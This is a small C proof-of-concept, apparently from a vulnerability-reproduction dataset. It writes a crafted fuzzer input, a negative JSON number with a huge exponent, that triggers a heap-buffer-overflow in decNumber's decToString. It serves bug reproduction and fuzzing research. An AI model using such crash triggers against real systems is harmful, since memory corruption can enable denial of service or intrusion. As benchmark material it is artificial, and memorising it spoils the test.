#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:64574 */
/* Triggers: heap-buffer-overflow in decToString at decNumber.c:3764 */
/* Vuln class: heap_buffer_overflow */
/* The buffer is allocated as digits+14 bytes, but decNumberToString */
/* can write up to digits+15 bytes for negative numbers with large exponents */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    /* fuzz_flags = 0 (4 bytes) */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
    /* dump_flags = 0 (4 bytes) */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
    /* JSON number: -16E-1061947065 */
    /* This has digits=2, so buffer = 2+14 = 16 bytes */
    /* But decNumberToString writes "-1.6E-1061947064\0" = 17 bytes */
    fprintf(f, "-16E-1061947065");
    
    fclose(f);
    return 0;
}